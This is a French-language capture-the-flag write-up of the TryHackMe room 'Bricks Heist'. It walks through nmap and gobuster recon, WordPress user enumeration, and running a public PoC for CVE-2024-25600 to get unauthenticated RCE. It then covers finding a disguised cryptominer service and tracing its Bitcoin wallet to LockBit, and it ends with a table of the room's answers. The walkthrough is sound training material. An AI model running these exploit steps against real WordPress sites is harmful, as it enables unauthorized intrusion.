# TryHack3M — Bricks Heist

**Plateforme :** TryHackMe  
**Difficulté :** Easy  
**Tags :** WordPress, RCE, CVE-2024-25600, Cryptominer, Forensic, OSINT  
**Date :** 02/06/2026

---

## C'est quoi ce room ?

Un site WordPress compromis. On doit comprendre comment il a été piraté, trouver ce que l'attaquant a laissé, et remonter jusqu'au threat group derrière tout ça.

Spoiler : c'est un cryptominer planqué dans les services système, avec un wallet Bitcoin lié à LockBit. Pas mal comme scénario.

---

## Méthodologie

Je suis parti sur la méthode classique : recon → énumération → exploitation → post-exploitation → OSINT. Étape par étape, on verra pourquoi c'est important de pas brûler les étapes.

---

## 1. Recon — Nmap

Premier réflexe : voir ce qui tourne sur la machine.

```bash
nmap -sS -vv 10.130.162.115
```

```
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
3306/tcp open   mysql
```

Deux choses qui m'ont alerté direct :
- **MySQL sur 3306 exposé publiquement** — pas normal, ça élargi la surface d'attaque
- **HTTPS sur 443** — j'ai failli scanner que le 80, ça aurait été une erreur

---

## 2. Enumération — Gobuster

Premier essai de Gobuster sur HTTP → erreur. Le serveur répond **405** pour les URLs inexistantes au lieu du 404 classique, donc Gobuster peut pas distinguer "trouvé" de "pas trouvé".

Solution : filtrer par taille de réponse plutôt que par code HTTP.

```bash
gobuster dir -u https://bricks.thm \
  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
  --exclude-length 472 \
  -x txt,php \
  -k
```

Le `-k` c'est pour ignorer les erreurs de certificat SSL — important vu qu'on est sur un lab.

Résultats intéressants :
```
/wp-login.php     [200]
/license.txt      [200]
/robots.txt       [200]
/wp-content       [301]
/wp-includes      [301]
```

C'est clairement du WordPress. Je vérifie la version du thème :

```bash
curl -k https://bricks.thm/wp-content/themes/bricks/style.css | head -20
```

```
Theme Name: Bricks
Version: 1.9.5
```

**Bricks Builder 1.9.5** — la CVE-2024-25600 est patchée en 1.9.7. On est en dessous, c'est vulnérable.

Bonus — l'API REST WordPress expose les users sans auth :

```bash
curl -k https://bricks.thm/wp-json/wp/v2/users
```

```json
{"slug":"administrator", "url":"http://localhost:8000"}
```

Deux infos : un seul user (`administrator`), et le site tourne en interne sur `localhost:8000` — potentiel vecteur SSRF à garder dans un coin.

---

## 3. Exploitation — CVE-2024-25600

La faille : l'endpoint `/wp-json/bricks/v1/render_element` exécute du PHP sans vérifier correctement le nonce. Résultat : RCE non authentifiée sur n'importe quel site avec Bricks Builder ≤ 1.9.6.

J'ai utilisé le PoC de K3ysTr0K3R (le PoC de Chocapikk nécessite Python 3.10+ et ma machine était en 3.8) :

```bash
git clone https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT.git
cd CVE-2024-25600-EXPLOIT
pip3 install rich requests
python3 CVE-2024-25600.py -u https://bricks.thm
```

```
Shell>   ← on est dedans
```

---

## 4. Post-exploitation — Détection du miner

Une fois le shell obtenu, je liste les services qui tournent pour chercher quelque chose d'anormal :

```bash
systemctl list-units --type=service --state=running
```

Deux services qui sortent du lot direct :

```
badr.service    → "Badr Service"     — nom inconnu, 730MB RAM
ubuntu.service  → "TRYHACK3M"        — description plantée par l'attaquant
```

Je creuse `ubuntu.service` :

```bash
systemctl status ubuntu.service
```

```
● ubuntu.service - TRYHACK3M
   Main PID: 204456 (nm-inet-dialog)
   CGroup: /lib/NetworkManager/nm-inet-dialog
```

Voilà le truc malin : le binaire s'appelle `nm-inet-dialog` et il est planqué dans `/lib/NetworkManager/` — il se déguise en composant NetworkManager pour passer inaperçu. Le service est `enabled` donc il redémarre tout seul au reboot. L'attaquant a bien assuré sa persistance.

```bash
ls /lib/NetworkManager/
```

```
nm-inet-dialog   inet.conf   nm-dispatcher   ...
```

`inet.conf` — c'est le fichier de config du miner. Il contient le wallet.

---

## 5. OSINT — Wallet & Attribution

Le wallet dans `inet.conf` était encodé. En passant par CyberChef avec l'option Magic (détection automatique des encodages), j'ai décodé une chaîne Hex → Base64 → Base64 :

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

Format Bech32 — c'est du Bitcoin.

Pour l'attribution : je cherche l'adresse sur [blockchain.com/explorer](https://www.blockchain.com/explorer). Une transaction liée mène au wallet `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r` — en googlant ce wallet on tombe directement sur le site de l'**OFAC** (US Treasury), qui liste ce wallet comme appartenant au groupe **LockBit**.

---

## Réponses

| Question | Réponse |
|---|---|
| Fichier .txt caché | `find /var/www -name "*.txt"` via RCE |
| Processus suspect | `nm-inet-dialog` |
| Service associé | `ubuntu.service` |
| Fichier de log du miner | `inet.conf` |
| Wallet du miner | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` |
| Threat Group | `LockBit` |

---

## Ce que j'ai retenu

- Un 405 sur les URLs inexistantes peut bloquer Gobuster — toujours filtrer par taille de réponse si le filtrage par code HTTP ne marche pas
- L'API REST WP expose les usernames sans auth, c'est un classique à checker systématiquement
- Les attaquants sont malins avec le camouflage : binaire dans `/lib/NetworkManager/`, nom crédible, service qui se fait passer pour un composant Ubuntu légitime
- L'OSINT sur les wallets Bitcoin c'est puissant pour l'attribution — blockchain explorer + OFAC c'est suffisant pour remonter à un threat group
- Toujours scanner le HTTPS séparément du HTTP, les résultats peuvent être complètement différents

---

*writeup par [Miri](https://portfolio.miriway.pro) — miri@miriway.pro*
